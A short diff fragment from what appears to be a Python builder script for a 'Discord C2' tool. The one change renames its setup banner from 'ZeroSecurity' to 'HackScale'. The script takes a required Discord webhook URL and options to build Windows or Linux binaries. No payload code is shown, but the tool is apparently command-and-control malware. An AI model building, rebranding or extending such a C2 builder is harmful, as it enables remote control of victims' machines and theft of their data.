@@ -30,7 +30,7 @@ def install_wine_python311():
 
 # -------------------------------------------------
 def main():
-    parser = argparse.ArgumentParser(description="ZeroSecurity Setup - Discord C2 Version")
+    parser = argparse.ArgumentParser(description="HackScale Setup - Discord C2 Version")
     parser.add_argument("--webhook", required=True, help="Discord webhook URL")
     parser.add_argument("--windows", action="store_true", help="Build Windows EXE with Wine Python 3.11")
     parser.add_argument("--linux", action="store_true", help="Build Linux binary")
